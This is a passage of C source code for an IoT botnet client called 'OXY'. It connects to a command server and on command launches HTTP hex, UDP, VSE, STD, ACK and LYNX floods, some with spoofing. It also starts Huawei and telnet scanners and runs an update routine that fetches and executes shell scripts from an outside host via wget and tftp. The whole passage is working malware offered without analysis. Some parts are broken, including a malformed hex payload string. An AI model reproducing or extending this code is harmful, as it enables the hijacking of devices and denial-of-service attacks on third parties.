	sprintf(hexbuffer, "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A");

	for (i = 0; i < power; i++)
	{
		sprintf(request, "%s /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, hexbuffer, host, UserAgents[(rand() % 6)]);
		
		if (fork())
		{
			while (end > time(NULL))
			{
				socket = socket_connect(host, port);
				if (socket != 0)
				{
					write(socket, request, strlen(request));
					read(socket, buffer, 1);
					close(socket);
				}
			}
			exit(0);
		}
	}
}

void oxy_update()
{
	int pid;

	if ((pid = fork()) == 0) 
	{
		system("cd /var/;wget http://xo.alprazolam.rip/bins.sh;chmod 777 bins.sh;sh bins.sh;rm -rf bins.sh;tftp -g xo.alprazolam.rip -r tftp1.sh;chmod 777 tftp1.sh;sh tftp1.sh;rm -rf tftp1.sh;tftp xo.alprazolam.rip -c get tftp2.sh;chmod 777 tftp2.sh;sh tftp2.sh;rm -rf tftp2.sh");
		sleep(20);	
	}
	else
	{
		printf("%d\n");
	}
	return;
}

void processCmd(int argc, unsigned char *argv[])
{
	if (!strcmp(argv[0], "HUAWEI"))
	{
		if (!strcmp(argv[1], "ON"))
		{
			sockprintf(oxyCommSock, "OXY : INITIATING HUAWEI SCANNER [%s]", inet_ntoa(ourIP));
			#ifdef DEBUG
				printf("[main] recieved command. calling huawei scanner");
			#endif
			huawei_init();
		}
		
		if (!strcmp(argv[1], "OFF"))
		{
			sockprintf(oxyCommSock, "OXY : KILLING HUAWEI SCANNER [%s]", inet_ntoa(ourIP));
			#ifdef DEBUG
				printf("[main] recieved command. killing huawei scanner");
			#endif
			huawei_kill();
		}
	}
	
	if (!strcmp(argv[0], "TELNET"))
	{
		if (!strcmp(argv[1], "ON"))
		{
			sockprintf(oxyCommSock, "OXY : INITIATING TELNET SCANNER [%s]", inet_ntoa(ourIP));
			#ifdef DEBUG
				printf("[main] recieved command. calling telnet scanner");
			#endif
			//call_scanner
		}
		
		if (!strcmp(argv[1], "OFF"))
		{
			sockprintf(oxyCommSock, "OXY : KILLING TELNET SCANNER [%s]", inet_ntoa(ourIP));
			#ifdef DEBUG
				printf("[main] recieved command. killing telnet scanner");
			#endif
			//kill_scanner
		}
	}
	
	if (!strcmp(argv[0], "UPDATE"))
	{
		sockprintf(oxyCommSock, "OXY : UPDATING RUNNING OXY INSTANCE [%s]", inet_ntoa(ourIP));
		#ifdef DEBUG
				printf("[main] recieved command. updating build");
		#endif
		oxy_update();
	}
	
	if (!strcmp(argv[0], "HEX"))
	{
		#ifdef DEBUG
				printf("[main] recieved command. launching hex flood");
		#endif
		if (argc < 5 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1) return;
		if (listFork()) return;
		httphex(argv[1], argv[2], atoi(argv[3]), atoi(argv[4]), atoi(argv[5]));
		exit(0);
	}
	
	if(!strcmp(argv[0], "UDP")) 
	{
		#ifdef DEBUG
				printf("[main] recieved command. launching udp flood");
		#endif
		
		if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) 
		{
			return;
		}	
		
		unsigned char *ip = argv[1];
		int port = atoi(argv[2]);
		int time = atoi(argv[3]);
		int spoofed = atoi(argv[4]);
		int packetsize = atoi(argv[5]);
		int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
		int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
		int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
		if(strstr(ip, ",") != NULL) 
		{
			unsigned char *hi = strtok(ip, ",");
			while(hi != NULL) 
			{
				if(!listFork()) 
				{
					udpflood(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
					_exit(0);
				}
				hi = strtok(NULL, ",");
			}
		} 
		else 
		{
			if (!listFork())
			{
				udpflood(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
				_exit(0);
			}
		}
		return;
	}

	if(!strcmp(argv[0], "VSE")) 
	{
		#ifdef DEBUG
				printf("[main] recieved command. launching vse flood");
		#endif
		
		if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) 
		{
			return;
		}
		
		unsigned char *ip = argv[1];
		int port = atoi(argv[2]);
		int time = atoi(argv[3]);
		int spoofed = atoi(argv[4]);
		int packetsize = atoi(argv[5]);
		int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
		int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
		int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
		if(strstr(ip, ",") != NULL) 
		{
			unsigned char *hi = strtok(ip, ",");
			while(hi != NULL) 
			{
				if(!listFork()) 
				{
					vseflood(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
					_exit(0);
				}
				hi = strtok(NULL, ",");
			}
		} 
		else 
		{
			if (!listFork())
			{
				vseflood(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
				_exit(0);
			}
		}
		return;
	}
	
	if(!strcmp(argv[0], "STD")) 
	{
		if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) 
		{
			return;
		} 
		
		unsigned char *ip = argv[1];
		int port = atoi(argv[2]);
		int time = atoi(argv[3]);
		if(strstr(ip, ",") != NULL) 
		{
			unsigned char *hi = strtok(ip, ",");
			while(hi != NULL) 
			{
				if(!listFork()) 
				{
					stdflood(hi, port, time);
					_exit(0);
				}
				hi = strtok(NULL, ",");
			}
		} 
		else 
		{
			if (listFork()) { return; }
			stdflood(ip, port, time);
			_exit(0);
		}
	}
	
	if(!strcmp(argv[0], "ACK"))
	{
		#ifdef DEBUG
				printf("[main] recieved command. launching ack flood");
		#endif
		
		if(argc < 6)
		{
			return;
		}

		unsigned char *ip = argv[1];
		int port = atoi(argv[2]);
		int time = atoi(argv[3]);
		int spoofed = atoi(argv[4]);

		int pollinterval = argc == 7 ? atoi(argv[6]) : 10;
		int psize = argc > 5 ? atoi(argv[5]) : 0;

		if(strstr(ip, ",") != NULL)
		{
			unsigned char *hi = strtok(ip, ",");
			while(hi != NULL)
			{
				if(!listFork())
				{
					ackflood(hi, port, time, spoofed, psize, pollinterval);
					_exit(0);
				}
				hi = strtok(NULL, ",");
			}
		} 
		else 
		{
			if (listFork()) { return; }
			ackflood(ip, port, time, spoofed, psize, pollinterval);
			_exit(0);
		}
	}
		
	if(!strcmp(argv[0], "LYNX"))
	{
		#ifdef DEBUG
				printf("[main] recieved command. launching lynx flood");
		#endif
		
		if(argc < 6)
		{            
			return;
		}

		unsigned char *ip = argv[1];
		int port = atoi(argv[2]);
		int time = atoi(argv[3]);
		int spoofed = atoi(argv[4]);

		int pollinterval = argc == 7 ? atoi(argv[6]) : 10;
		int psize = argc > 5 ? atoi(argv[5]) : 0;

		if(strstr(ip, ",") != NULL)
		{
			unsigned char *hi = strtok(ip, ",");
			while(hi != NULL)
			{
				if(!listFork())
				{
					lynxflood(hi, port, time, spoofed, psize, pollinterval);
					_exit(0);
				}
				hi = strtok(NULL, ",");
			}
		} 
		else 
		{
			if (listFork()) { return; }
			lynxflood(ip, port, time, spoofed, psize, pollinterval);
			_exit(0);
		}
	}

	if(!strcmp(argv[0], "KILL"))
	{
		#ifdef DEBUG
				printf("[main] recieved command. killing running pid's");
		#endif
		
		int killed = 0;
		unsigned long i;
		for (i = 0; i < numpids; i++) 
		{
			if (pids[i] != 0 && pids[i] != getpid()) 
			{
				kill(pids[i], 9);
				killed++;
			}
		}
	}	
}

int initConnection()
{
	unsigned char server[4096];
	memset(server, 0, 4096);
	if(oxyCommSock) { close(oxyCommSock); oxyCommSock = 0; }
	if(oxyServer + 1 == SERVER_LIST_SIZE) oxyServer = 0;
	else oxyServer++;
	szprintf(server, "%d.%d.%d.%d", oxyHost1, oxyHost2, oxyHost3, oxyHost4);
	int port = oxyPort;
	if(strchr(server, ':') != NULL)
	{
		port = atoi(strchr(server, ':') + 1);
		*((unsigned char *)(strchr(server, ':'))) = 0x0;
	}
	oxyCommSock = socket(AF_INET, SOCK_STREAM, 0);
	if(!connectTimeout(oxyCommSock, server, port, 30)) return 1;
	return 0;
}

int getOurIP() 
{
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if(sock == -1) return 0;
	struct sockaddr_in serv;
	memset(&serv, 0, sizeof(serv));
	serv.sin_family = AF_INET;
	serv.sin_addr.s_addr = inet_addr("8.8.8.8");
	serv.sin_port = htons(53);
	int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
	if(err == -1) return 0;
	struct sockaddr_in name;
	socklen_t namelen = sizeof(name);
	err = getsockname(sock, (struct sockaddr*) &name, &namelen);
	if(err == -1) return 0;
	ourIP.s_addr = name.sin_addr.s_addr;
	int cmdline = open("/proc/net/route", O_RDONLY);
	char linebuf[4096];
	while(fdgets(linebuf, 4096, cmdline) != NULL) 
	{
		if(strstr(linebuf, "\t00000000\t") != NULL) 
		{
			unsigned char *pos = linebuf;
			while(*pos != '\t') pos++;
			*pos = 0;
			break;
		}
		memset(linebuf, 0, 4096);
	}
	close(cmdline);
	if(*linebuf) 
	{
		int i;
		struct ifreq ifr;
		strcpy(ifr.ifr_name, linebuf);
		ioctl(sock, SIOCGIFHWADDR, &ifr);
		for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
	}
	close(sock);
}

char *getBuild()
{
 #if defined(__x86_64__) || defined(_M_X64)
    return "X86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "X86_32";
    #elif defined(__ARM_ARCH_2__)
    return "ARM2";
    #elif defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__)
    return "ARM3";
    #elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "ARM4";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "ARM5"
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_)
    return "ARM6";
    #elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__)
    return "ARM6";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "ARM7";
    #elif defined(__aarch64__)
    return "ARM64";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "MIPS";
	#elif defined(mipsel) || defined(__mipsel__) || defined(__mipsel)
    return "MIPSEL";
    #elif defined(__sh__)
    return "SUPERH";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "POWERPC";
    #elif defined(__sparc__) || defined(__sparc)
    return "SPARC";
    #elif defined(__m68k__)
    return "M68K";
    #else
    return "???"; 
    #endif
}

int main(int argc, unsigned char *argv[])
{ 
	if(SERVER_LIST_SIZE <= 0) return 0;
	srand(time(NULL) ^ getpid());
	init_rand(time(NULL) ^ getpid());
	pid_t pid1;
	pid_t pid2;
	int status;
	char *device_arch = getBuild();
	getOurIP();
	huawei_init();
	watchdog_maintain();

	if (pid1 = fork()) 
	{
		waitpid(pid1, &status, 0);
		exit(0);
    } 
	else if (!pid1) 
	{
		if (pid2 = fork()) 
		{
			exit(0);
        } 
		else if (!pid2) 
		{
        } 
		else 
		{
		//N
		}
	} 
	else 
	{
	//N
	} 

	signal(SIGPIPE, SIG_IGN);

	while(1)
	{
		if(initConnection()) { sleep(5); continue; }

		sockprintf(oxyCommSock, "OXY : DEVICE CONNECTED [IP: %s] [ARCH: %s]", inet_ntoa(ourIP), getBuild());

		char commBuf[4096];
		int got = 0;
		int i = 0;
		while((got = recvLine(oxyCommSock, commBuf, 4096)) != -1)
		{
			for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) 
			{
				unsigned int *newpids, on;
				for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
				pids[on - 1] = 0;
				numpids--;
				newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
				for (on = 0; on < numpids; on++) newpids[on] = pids[on];
				free(pids);
				pids = newpids;
			}
			
			commBuf[got] = 0x00;
			trim(commBuf);
			unsigned char *m3ss4ge = commBuf;

			if(*m3ss4ge == '.')
			{
				unsigned char *nickMask = m3ss4ge + 1;
				while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
				if(*nickMask == 0x00) continue;
				*(nickMask) = 0x00;
				nickMask = m3ss4ge + 1;

				m3ss4ge = m3ss4ge + strlen(nickMask) + 2;
				while(m3ss4ge[strlen(m3ss4ge) - 1] == '\n' || m3ss4ge[strlen(m3ss4ge) - 1] == '\r') m3ss4ge[strlen(m3ss4ge) - 1] = 0x00;

				unsigned char *command = m3ss4ge;
				while(*m3ss4ge != ' ' && *m3ss4ge != 0x00) m3ss4ge++;
				*m3ss4ge = 0x00;
				m3ss4ge++;

				unsigned char *tCpc0mm4nd = command;
				while(*tCpc0mm4nd) { *tCpc0mm4nd = toupper(*tCpc0mm4nd); tCpc0mm4nd++; }

				unsigned char *params[10];
				int paramsCount = 1;
				unsigned char *pch = strtok(m3ss4ge, " ");
				params[0] = command;

				while(pch)
				{
					if(*pch != '\n')
					{
						params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
						memset(params[paramsCount], 0, strlen(pch) + 1);
						strcpy(params[paramsCount], pch);
						paramsCount++;
					}
					pch = strtok(NULL, " ");
				}

				processCmd(paramsCount, params);

				if(paramsCount > 1)
				{
					int q = 1;
					for(q = 1; q < paramsCount; q++)
					{
						free(params[q]);
					}
				}
			}
		}
               
	}
	return 0;
}
